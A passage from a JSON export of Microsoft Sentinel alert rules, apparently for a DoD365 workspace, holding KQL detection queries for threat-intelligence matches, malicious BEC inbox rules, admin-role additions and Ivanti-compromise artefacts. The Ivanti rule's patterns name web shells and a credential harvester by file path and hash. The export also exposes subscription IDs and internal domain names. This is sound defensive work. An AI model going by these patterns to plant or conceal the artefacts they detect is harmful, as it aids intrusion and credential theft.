arg_max(SecurityEvent_TimeGenerated, *) by IndicatorId, FileHash\n| project SecurityEvent_TimeGenerated, Description, ActivityGroupNames, IndicatorId, ThreatType, Url, ExpirationDateTime, ConfidenceScore,\nProcess, FileHash, Computer, Account, Event, FileHashValue, FileHashType\n| extend NTDomain = tostring(split(Account, '\\\\', 0)[0]), Name = tostring(split(Account, '\\\\', 1)[0])\n| extend HostName = tostring(split(Computer, '.', 0)[0]), DnsDomain = tostring(strcat_array(array_slice(split(Computer, '.'), 1, -1), '.')) \n| extend timestamp = SecurityEvent_TimeGenerated\n","suppressionDuration":"PT1H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"Account"},{"identifier":"Name","columnName":"Name"},{"identifier":"NTDomain","columnName":"NTDomain"}]},{"entityType":"Host","fieldMappings":[{"identifier":"FullName","columnName":"Computer"},{"identifier":"HostName","columnName":"HostName"},{"identifier":"DnsDomain","columnName":"DnsDomain"}]},{"entityType":"URL","fieldMappings":[{"identifier":"Url","columnName":"Url"}]},{"entityType":"FileHash","fieldMappings":[{"identifier":"Value","columnName":"FileHashValue"},{"identifier":"Algorithm","columnName":"FileHashType"}]}],"templateVersion":"1.4.5","eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Impact"],"techniques":[],"displayName":"TI map File Hash to Security Event","enabled":true,"description":"Identifies a match in Security Event data from any File Hash IOC from TI","alertRuleTemplateName":"a7427ed7-04b4-4e3b-b323-08b981b9b4bf","lastModifiedUtc":"2024-04-24T19:21:37.7140463Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/3837f3a6-539e-4168-8fad-11ee59050916","name":"3837f3a6-539e-4168-8fad-11ee59050916","etag":"\"7708d60f-0000-2700-0000-66295a8e0000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"P14D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"let dt_lookBack = 1h;\nlet ioc_lookBack = 14d;\nlet Signins = materialize(union isfuzzy=true\n  (SigninLogs\n  | where TimeGenerated >= ago(dt_lookBack)),\n  (AADNonInteractiveUserSignInLogs\n  | where TimeGenerated >= ago(dt_lookBack)\n  | extend Status = todynamic(Status), LocationDetails = todynamic(LocationDetails)));\nlet SigninIPs = Signins | summarize make_list(IPAddress);\nlet TI = materialize(ThreatIntelligenceIndicator\n  | where isnotempty(NetworkIP) or isnotempty(EmailSourceIpAddress) or isnotempty(NetworkDestinationIP) or isnotempty(NetworkSourceIP)\n  | where TimeGenerated >= ago(ioc_lookBack)\n  | extend TI_ipEntity = coalesce(NetworkIP, EmailSourceIpAddress, NetworkDestinationIP, NetworkSourceIP)\n  | where TI_ipEntity in (SigninIPs)\n  | summarize LatestIndicatorTime = arg_max(TimeGenerated, *) by IndicatorId\n  | where Active == true and ExpirationDateTime > now()\n  | where Description !contains_cs \"State: inactive;\" and Description !contains_cs \"State: falsepos;\");\nTI\n// using innerunique to keep perf fast and result set low, we only need one match to indicate potential malicious activity that needs to be investigated\n| join kind=innerunique (Signins) on $left.TI_ipEntity == $right.IPAddress\n| project-rename SigninLogs_TimeGenerated = TimeGenerated\n| where SigninLogs_TimeGenerated < ExpirationDateTime\n| extend StatusCode = tostring(Status.errorCode), StatusDetails = tostring(Status.additionalDetails), StatusReason = tostring(Status.failureReason)\n| summarize SigninLogs_TimeGenerated = arg_max(SigninLogs_TimeGenerated, *) by IndicatorId, IPAddress\n| project SigninLogs_TimeGenerated, Description, ActivityGroupNames, IndicatorId, ThreatType, Url, ExpirationDateTime, ConfidenceScore, TI_ipEntity, IPAddress, UserPrincipalName, AppDisplayName, StatusCode, StatusDetails, StatusReason, NetworkIP, NetworkDestinationIP, NetworkSourceIP, EmailSourceIpAddress, Type\n| extend timestamp = SigninLogs_TimeGenerated, Name = tostring(split(UserPrincipalName, '@', 0)[0]), UPNSuffix = tostring(split(UserPrincipalName, '@', 1)[0])\n","suppressionDuration":"PT1H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"UserPrincipalName"},{"identifier":"Name","columnName":"Name"},{"identifier":"UPNSuffix","columnName":"UPNSuffix"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"IPAddress"}]},{"entityType":"URL","fieldMappings":[{"identifier":"Url","columnName":"Url"}]}],"templateVersion":"1.2.7","eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Impact"],"techniques":[],"displayName":"TI Map IP Entity to SigninLogs","enabled":true,"description":"This query maps any IP indicators of compromise (IOCs) from threat intelligence (TI), by searching for matches in SigninLogs.","alertRuleTemplateName":"f2eb15bd-8a88-4b24-9281-e133edfba315","lastModifiedUtc":"2024-04-24T19:16:28.0330305Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/56be27f3-703a-49b2-890a-f2eddde1c75e","name":"56be27f3-703a-49b2-890a-f2eddde1c75e","etag":"\"7708559c-0000-2700-0000-66295b300000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"P14D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"let dt_lookBack = 1h; // Look back 1 hour for DNS events\nlet ioc_lookBack = 14d; // Look back 14 days for threat intelligence indicators\n// Fetch threat intelligence indicators related to IP addresses\nlet IP_Indicators = ThreatIntelligenceIndicator\n  | where isnotempty(NetworkIP) or isnotempty(EmailSourceIpAddress) or isnotempty(NetworkDestinationIP) or isnotempty(NetworkSourceIP)\n  | where TimeGenerated >= ago(ioc_lookBack)\n  | extend TI_ipEntity = iff(isnotempty(NetworkIP), NetworkIP, NetworkDestinationIP)\n  | extend TI_ipEntity = iff(isempty(TI_ipEntity) and isnotempty(NetworkSourceIP), NetworkSourceIP, TI_ipEntity)\n  | extend TI_ipEntity = iff(isempty(TI_ipEntity) and isnotempty(EmailSourceIpAddress), EmailSourceIpAddress, TI_ipEntity)\n  | where ipv4_is_private(TI_ipEntity) == false and  TI_ipEntity !startswith \"fe80\" and TI_ipEntity !startswith \"::\" and TI_ipEntity !startswith \"127.\"\n  | summarize LatestIndicatorTime = arg_max(TimeGenerated, *) by IndicatorId\n  | where Active == true and ExpirationDateTime > now();\n// Perform a join between IP indicators and DNS events\nIP_Indicators\n  // Use innerunique to keep performance fast and result set low, as we only need one match to indicate potential malicious activity that needs investigation\n  | join kind=innerunique (\n      DnsEvents\n      | where TimeGenerated >= ago(dt_lookBack)\n      | where SubType =~ \"LookupQuery\" and isnotempty(IPAddresses)\n      | mv-expand SingleIP = split(IPAddresses, \", \") to typeof(string)\n      | extend DNS_TimeGenerated = TimeGenerated\n  )\n  on $left.TI_ipEntity == $right.SingleIP\n  // Filter out DNS events that occurred after the expiration of the corresponding indicator\n  | where DNS_TimeGenerated < ExpirationDateTime\n  // Group the results by IndicatorId and SingleIP, and keep the DNS event with the latest timestamp\n  | summarize DNS_TimeGenerated = arg_max(DNS_TimeGenerated, *) by IndicatorId, SingleIP\n  // Select the desired output fields\n  | project DNS_TimeGenerated, Description, ActivityGroupNames, IndicatorId, ThreatType, Url, DomainName, ExpirationDateTime, ConfidenceScore,\n    TI_ipEntity, Computer, EventId, SubType, ClientIP, Name, IPAddresses, NetworkIP, NetworkDestinationIP, NetworkSourceIP, EmailSourceIpAddress, Type\n  | extend timestamp = DNS_TimeGenerated, HostName = tostring(split(Computer, '.', 0)[0]), DnsDomain = tostring(strcat_array(array_slice(split(Computer, '.'), 1, -1), '.'))\n","suppressionDuration":"PT1H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Host","fieldMappings":[{"identifier":"FullName","columnName":"Computer"},{"identifier":"HostName","columnName":"HostName"},{"identifier":"DnsDomain","columnName":"DnsDomain"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"ClientIP"}]},{"entityType":"URL","fieldMappings":[{"identifier":"Url","columnName":"Url"}]}],"templateVersion":"1.4.2","eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Impact"],"techniques":[],"displayName":"TI Map IP Entity to DnsEvents","enabled":true,"description":"This query maps any IP indicators of compromise (IOCs) from threat intelligence (TI), by searching for matches in DnsEvents.","alertRuleTemplateName":"69b7723c-2889-469f-8b55-a2d355ed9c87","lastModifiedUtc":"2024-04-24T19:19:12.2806629Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/db800c0d-3498-444b-be57-12482f681264","name":"db800c0d-3498-444b-be57-12482f681264","etag":"\"870012d1-0000-2700-0000-66fdc9770000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"P1D","queryPeriod":"P1D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"High","query":"// BAH_Ivanti\n// Author: Edward Jiang\n// Description: Detects vulnerabilities affecting Ivanti Connect Secure VPN and Ivanti Policy Secure solutions. More information: https://www.mandiant.com/resources/blog/investigating-ivanti-zero-day-exploitation\nlet signInLookup = (\nSigninLogs\n| where TimeGenerated >= ago(1d) \n| where DeviceDetail contains \"displayName\"\n| extend DeviceDetailJson = parse_json(DeviceDetail)\n| extend DeviceNameSI = tostring(DeviceDetailJson.displayName)\n| distinct DeviceNameSI, UserPrincipalName, UserDisplayName\n);\nlet ActionTypes = dynamic([\"FileCreated\", \"FileModified\"]);\nlet FileNames = dynamic([\"health.py\", \"compcheckresult.cgi\", \"lastauthserverused.js\", \"category.py\"]);\nlet WarpWireHashes = dynamic([\"2ec505088b942c234f39a37188e80d7a\", \"8eb042da6ba683ef1bae460af103cc44\", \"a739bd4c2b9f3679f43579711448786f\", \"a81813f70151a022ea1065b7f4d6b5ab\", \"d0c7a334a4d9dcd3c6335ae13bee59ea\", \"e8489983d73ed30a4240a14b1f161254\"]);\nlet FilteredDevices = materialize(\n    DeviceFileEvents\n    | where ActionType in (ActionTypes) and FileName in (FileNames)\n    );\nunion isfuzzy=true \n(\n    FilteredDevices\n    | where ActionType == \"FileCreated\" and FileName == \"health.py\" and FolderPath contains \"/home/venv3/lib/python3.6/site-packages/cav-0.1-py3.6.egg/cav/api/resources/\"\n    | extend SILogDeviceName = toupper((split(DeviceName, \".\"))[0])\n    | join kind=leftouter signInLookup on $left.SILogDeviceName == $right.DeviceNameSI\n    | project TimeGenerated, DeviceName, UserPrincipalName, RequestAccountName, FileName, FolderPath, MD5, Tactic = \"CHAINLINE Web Shell\"\n),\n(\n    FilteredDevices\n    | where ActionType == \"FileModified\" and FileName == \"compcheckresult.cgi\" and MD5 == \"3d97f55a03ceb4f71671aa2ecf5b24e9\"\n    | extend SILogDeviceName = toupper((split(DeviceName, \".\"))[0])\n    | join kind=leftouter signInLookup on $left.SILogDeviceName == $right.DeviceNameSI\n    | project TimeGenerated, DeviceName, UserPrincipalName, RequestAccountName, FileName, FolderPath, MD5, Tactic = \"LIGHTWIRE Web Shell\"\n),\n(\n    FilteredDevices\n    | where FileName == \"lastauthserverused.js\" and MD5 in (WarpWireHashes)\n    | extend SILogDeviceName = toupper((split(DeviceName, \".\"))[0])\n    | join kind=leftouter signInLookup on $left.SILogDeviceName == $right.DeviceNameSI\n    | project TimeGenerated, DeviceName, UserPrincipalName, RequestAccountName, FileName, FolderPath, MD5, Tactic = \"WARPWIRE credential harvester\"\n),\n(\n    FilteredDevices\n    | where FileName == \"category.py\" and MD5 == \"465600cece80861497e8c1c86a07a23e\"\n    | extend SILogDeviceName = toupper((split(DeviceName, \".\"))[0])\n    | join kind=leftouter signInLookup on $left.SILogDeviceName == $right.DeviceNameSI\n    | project TimeGenerated, DeviceName, UserPrincipalName, RequestAccountName, FileName, FolderPath, MD5, Tactic = \"FRAMESTING web shell\"\n)","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5M","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":null,"groupByCustomDetails":null}},"customDetails":{"Ivanti_Behavior":"Tactic"},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"Name","columnName":"UserPrincipalName"}]},{"entityType":"Host","fieldMappings":[{"identifier":"HostName","columnName":"DeviceName"}]},{"entityType":"File","fieldMappings":[{"identifier":"Directory","columnName":"FolderPath"},{"identifier":"Name","columnName":"FileName"}]},{"entityType":"FileHash","fieldMappings":[{"identifier":"Value","columnName":"MD5"}]}],"alertDetailsOverride":{"alertDynamicProperties":[]},"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Persistence","Exfiltration"],"techniques":["T1505","T1041"],"displayName":"BAH_Ivanti","enabled":true,"description":"Looks for behavior related to the Ivanti Emergency Directive 24-01. The behaviors detected are: CHAINLINE Web Shell, LIGHTWIRE Web Shell, WARPWIRE Credential Harvester Variant, and FRAMESTING Web Shell.\nFor more info: https://www.mandiant.com/resources/blog/investigating-ivanti-zero-day-exploitation\nPLATFORM:Windows\nMITRE:TA0003;T1505,TA0010;T1041","alertRuleTemplateName":null,"lastModifiedUtc":"2024-10-02T22:30:14.2743427Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/949417db-bfaa-4495-ab2d-54c6e67a3570","name":"949417db-bfaa-4495-ab2d-54c6e67a3570","etag":"\"7808c666-0000-2700-0000-66295c1d0000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"P14D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"let dt_lookBack = 1h;\nlet ioc_lookBack = 14d;\nlet emailregex = @'^[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\\.[a-zA-Z0-9-.]+$';\nlet Signins = materialize(union isfuzzy=true\n( SigninLogs | where TimeGenerated >= ago(dt_lookBack)),\n( AADNonInteractiveUserSignInLogs | where TimeGenerated >= ago(dt_lookBack)\n    | extend Status = todynamic(Status), LocationDetails = todynamic(LocationDetails))\n| where isnotempty(UserPrincipalName) and UserPrincipalName matches regex emailregex\n| extend UserPrincipalName = tolower(UserPrincipalName)\n| extend Status = todynamic(Status), LocationDetails = todynamic(LocationDetails)\n| extend StatusCode = tostring(Status.errorCode), StatusDetails = tostring(Status.additionalDetails)\n| extend State = tostring(LocationDetails.state), City = tostring(LocationDetails.city), Region = tostring(LocationDetails.countryOrRegion)\n| extend SigninLogs_TimeGenerated = TimeGenerated);\nlet SigninUPNs = Signins | distinct UserPrincipalName | summarize make_list(UserPrincipalName);\nThreatIntelligenceIndicator\n//Filtering the table for Email related IOCs\n| where isnotempty(EmailSenderAddress)\n| where TimeGenerated >= ago(ioc_lookBack)\n| where EmailSenderAddress in (SigninUPNs)\n| summarize LatestIndicatorTime = arg_max(TimeGenerated, *) by IndicatorId\n| where Active == true and ExpirationDateTime > now()\n| where Description !contains_cs \"State: inactive;\" and Description !contains_cs \"State: falsepos;\"\n| join kind=innerunique (Signins) on $left.EmailSenderAddress == $right.UserPrincipalName\n| where SigninLogs_TimeGenerated < ExpirationDateTime\n| summarize SigninLogs_TimeGenerated = arg_max(SigninLogs_TimeGenerated, *) by IndicatorId, UserPrincipalName\n| project SigninLogs_TimeGenerated, Description, ActivityGroupNames, IndicatorId, ThreatType, Url, ExpirationDateTime, ConfidenceScore, EmailSenderName, EmailRecipient, EmailSourceDomain, EmailSourceIpAddress, EmailSubject, FileHashValue, FileHashType, IPAddress, UserPrincipalName, AppDisplayName, StatusCode, StatusDetails, NetworkIP, NetworkDestinationIP, NetworkSourceIP, Type\n| extend Name = tostring(split(UserPrincipalName, '@', 0)[0]), UPNSuffix = tostring(split(UserPrincipalName, '@', 1)[0])\n| extend timestamp = SigninLogs_TimeGenerated\n","suppressionDuration":"PT1H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"UserPrincipalName"},{"identifier":"Name","columnName":"Name"},{"identifier":"UPNSuffix","columnName":"UPNSuffix"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"IPAddress"}]},{"entityType":"URL","fieldMappings":[{"identifier":"Url","columnName":"Url"}]}],"templateVersion":"1.2.6","eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Impact"],"techniques":[],"displayName":"TI map Email entity to SigninLogs","enabled":true,"description":"Identifies a match in SigninLogs table from any Email IOC from TI","alertRuleTemplateName":"30fa312c-31eb-43d8-b0cc-bcbdfb360822","lastModifiedUtc":"2024-04-24T19:22:59.4562393Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/c9aa0093-0969-44ca-8db2-34a1208f66a3","name":"c9aa0093-0969-44ca-8db2-34a1208f66a3","etag":"\"5404c1e8-0000-2700-0000-667c35690000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"P1D","queryPeriod":"P1D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"let BEC_Keywords = dynamic([ 'invoice','payment','paycheck','transfer','bank statement','bank details','closing','funds','bank account','account details','remittance','purchase','deposit',\"PO#\",\"Zahlung\",\"Rechnung\",\"Paiement\", \"virement bancaire\",\"Bankuberweisung\",'hacked','phishing']);\nOfficeActivity\n| where Operation =~ \"New-InboxRule\"\n| where Parameters has \"Deleted Items\" or Parameters has \"Junk Email\"  or Parameters has \"DeleteMessage\"\n| extend Events=todynamic(Parameters)\n| parse Events  with * \"SubjectContainsWords\" SubjectContainsWords '}'*\n| parse Events  with * \"BodyContainsWords\" BodyContainsWords '}'*\n| parse Events  with * \"SubjectOrBodyContainsWords\" SubjectOrBodyContainsWords '}'*\n| where SubjectContainsWords has_any (BEC_Keywords)\n or BodyContainsWords has_any (BEC_Keywords)\n or SubjectOrBodyContainsWords has_any (BEC_Keywords)\n| extend ClientIPAddress = case( ClientIP has \".\", tostring(split(ClientIP,\":\")[0]), ClientIP has \"[\", tostring(trim_start(@'[[]',tostring(split(ClientIP,\"]\")[0]))), ClientIP )\n| extend Keyword = iff(isnotempty(SubjectContainsWords), SubjectContainsWords, (iff(isnotempty(BodyContainsWords),BodyContainsWords,SubjectOrBodyContainsWords )))\n| extend RuleDetail = case(OfficeObjectId contains '/' , tostring(split(OfficeObjectId, '/')[-1]) , tostring(split(OfficeObjectId, '\\\\')[-1]))\n| summarize count(), StartTimeUtc = min(TimeGenerated), EndTimeUtc = max(TimeGenerated) by  Operation, UserId, ClientIPAddress, ResultStatus, Keyword, OriginatingServer, OfficeObjectId, RuleDetail\n| extend UserName = split(UserId, '@')[0], DomainName = split(UserId, '@')[1]\n","suppressionDuration":"PT1H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"UserId"},{"identifier":"Name","columnName":"UserName"},{"identifier":"UPNSuffix","columnName":"DomainName"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"ClientIPAddress"}]}],"templateVersion":"1.0.2","eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Persistence","DefenseEvasion"],"techniques":["T1098","T1078"],"displayName":"Malicious BEC Inbox Rule","enabled":true,"description":"Often times after the initial compromise in a BEC attack the attackers create inbox rules to delete emails that contain certain keywords related to their BEC attack.\n This is done so as to limit ability to warn compromised users that they've been compromised","alertRuleTemplateName":"8ac77493-3cae-4840-8634-15fb23f8fb68","lastModifiedUtc":"2024-06-26T15:36:08.5361155Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/6b62bb33-9738-4d72-94d2-80ea5253cb06","name":"6b62bb33-9738-4d72-94d2-80ea5253cb06","etag":"\"870ddcc5-0000-2700-0000-6744c4870000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"P1D","queryPeriod":"P1D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Low","query":"AuditLogs\n| where OperationName in (\"Add eligible member (permanent)\", \"Add eligible member (eligible)\", \"Add member to role\")\n| mv-apply TargetResource = TargetResources on \n    (\n    where TargetResource.type =~ \"User\"\n    | extend\n        Target = tostring(TargetResource.userPrincipalName),\n        props = TargetResource.modifiedProperties\n    )\n| mv-apply Property = props on \n    (\n    where Property.displayName =~ \"Role.DisplayName\"\n    | extend RoleName = trim('\"', tostring(Property.newValue))\n    )\n| where RoleName contains \"admin\"\n| extend InitiatingAppName = tostring(InitiatedBy.app.displayName)\n| extend InitiatingAppServicePrincipalId = tostring(InitiatedBy.app.servicePrincipalId)\n| extend InitiatingUserPrincipalName = tostring(InitiatedBy.user.userPrincipalName)\n| extend InitiatingAadUserId = tostring(InitiatedBy.user.id)\n| extend InitiatingIPAddress = tostring(InitiatedBy.user.ipAddress)\n| extend InitiatedBy = iif(isnotempty(InitiatingAppName), InitiatingAppName, InitiatingUserPrincipalName)\n| extend TargetUserPrincipalName = iff(OperationName == \"Add member to role\", tostring(TargetResources[0].userPrincipalName), tostring(TargetResources[2].userPrincipalName))\n| extend TargetAadUserId = iff(OperationName == \"Add member to role\", tostring(TargetResources[0].id), tostring(TargetResources[2].id))\n| extend AddedUser = TargetUserPrincipalName\n| extend\n    TargetAccountName = tostring(split(TargetUserPrincipalName, \"@\")[0]),\n    TargetAccountUPNSuffix = tostring(split(TargetUserPrincipalName, \"@\")[1])\n| extend\n    InitiatingAccountName = tostring(split(InitiatingUserPrincipalName, \"@\")[0]),\n    InitiatingAccountUPNSuffix = tostring(split(InitiatingUserPrincipalName, \"@\")[1])\n| where not(AddedUser endswith \"dod365.adm.mil\" and InitiatedBy == \"MS-PIM-Fairfax\")\n| project-reorder TimeGenerated, AddedUser, RoleName, InitiatedBy","suppressionDuration":"PT1H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"TargetUserPrincipalName"},{"identifier":"Name","columnName":"TargetAccountName"},{"identifier":"UPNSuffix","columnName":"TargetAccountUPNSuffix"}]},{"entityType":"Account","fieldMappings":[{"identifier":"AadUserId","columnName":"TargetAadUserId"}]},{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"InitiatingUserPrincipalName"},{"identifier":"Name","columnName":"InitiatingAccountName"},{"identifier":"UPNSuffix","columnName":"InitiatingAccountUPNSuffix"}]},{"entityType":"Account","fieldMappings":[{"identifier":"AadUserId","columnName":"InitiatingAadUserId"}]}],"templateVersion":"1.0.4","eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["PrivilegeEscalation"],"techniques":["T1078"],"displayName":"User Added to Admin Role","enabled":true,"description":"Detects a user being added to a new privileged role. Monitor these additions to ensure the users are made eligible for these roles are intended to have these levels of access.\n  Ref: https://docs.microsoft.com/azure/active-directory/fundamentals/security-operations-privileged-accounts#changes-to-privileged-accounts","alertRuleTemplateName":"2a09f8cb-deb7-4c40-b08b-9137667f1c0b","lastModifiedUtc":"2024-11-25T18:40:07.3997196Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/39a7eff4-defd-44df-8001-ece1ada06995","name":"39a7eff4-defd-44df-8001-ece1ada06995","etag":"\"4e01e833-0000-2700-0000-66b9fc1c0000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"P14D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"// Title: TI Map File Hash to DeviceFileEvents\n// Author: Edward Jiang\n// Description: Alerts when Sentinel Threat Intelligence MD5 file hash indicators are detected in the DeviceFileEvents table.\n// False Positives: Check confidence score for low-confidence matches.\n\nlet dt_lookBack = 1h;\nlet ioc_lookBack = 14d;\nThreatIntelligenceIndicator\n| where TimeGenerated >= ago(ioc_lookBack) and ExpirationDateTime > now()\n| summarize LatestIndicatorTime = arg_max(TimeGenerated, *) by IndicatorId\n| where Active == true\n| where isnotempty(FileHashValue)\n| extend FileHashValue = toupper(FileHashValue)\n// using innerunique to keep perf fast and result set low, we only need one match to indicate potential malicious activity that needs to be investigated\n| join kind=innerunique (\n  DeviceFileEvents\n    | where TimeGenerated >= ago(dt_lookBack)\n    | where ActionType in (\"FileCreated\",\"FileModified\")\n    | where isnotempty(MD5)\n    | extend DeviceFileEvents_TimeGenerated = TimeGenerated, Event = ActionType, FileHash = toupper(MD5)\n)\non $left.FileHashValue == $right.FileHash\n| where DeviceFileEvents_TimeGenerated < ExpirationDateTime\n| summarize DeviceFileEvents_TimeGenerated = arg_max(DeviceFileEvents_TimeGenerated, *) by IndicatorId, FileHash\n| project DeviceFileEvents_TimeGenerated, Description, ActivityGroupNames, IndicatorId, ThreatType, Url, ExpirationDateTime, ConfidenceScore,\nInitiatingProcessCommandLine, InitiatingProcessFileName, InitiatingProcessFolderPath, FileHash, DeviceName, DeviceId, InitiatingProcessAccountName, Event, FileHashValue, FileHashType\n| extend timestamp = DeviceFileEvents_TimeGenerated\n\n","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5M","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":null,"groupByCustomDetails":null}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"Name","columnName":"InitiatingProcessAccountName"}]},{"entityType":"Host","fieldMappings":[{"identifier":"HostName","columnName":"DeviceName"}]},{"entityType":"FileHash","fieldMappings":[{"identifier":"Algorithm","columnName":"FileHashType"},{"identifier":"Value","columnName":"FileHashValue"}]},{"entityType":"File","fieldMappings":[{"identifier":"Directory","columnName":"InitiatingProcessFolderPath"},{"identifier":"Name","columnName":"InitiatingProcessFileName"}]},{"entityType":"Process","fieldMappings":[{"identifier":"CommandLine","columnName":"InitiatingProcessCommandLine"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Impact"],"techniques":[],"displayName":"TI Map File Hash to DeviceFileEvents","enabled":false,"description":"Identifies a match in DeviceFileEvents data from any File Hash IOC from TI","alertRuleTemplateName":null,"lastModifiedUtc":"2024-08-12T12:12:12.4207401Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/d1fc9b4e-5c42-4316-b669-303d05504c0a","name":"d1fc9b4e-5c42-4316-b669-303d05504c0a","etag":"\"030122c2-0000-2700-0000-664de2d60000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"P1D","queryPeriod":"P14D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"let auditList =\nAuditLogs\n| where TimeGenerated >= ago(14d)\n| where OperationName =~ \"Add member to role completed (PIM activation)\"\n| where Result =~ \"success\"\n| extend TargetUserPrincipalName = tostring(TargetResources[2].userPrincipalName)\n| extend displayName = tostring(TargetResources[0].displayName)\n| extend displayName2 = tostring(TargetResources[3].displayName)\n| extend ElevatedRole = iif(displayName =~ \"Member\", displayName2, displayName)\n;\nlet lookbackList = auditList\n| where TimeGenerated between(ago(14d)..ago(1d))\n;\nlet recentList = auditList\n| where TimeGenerated > ago(1d)\n;\nlet newlyElevated = 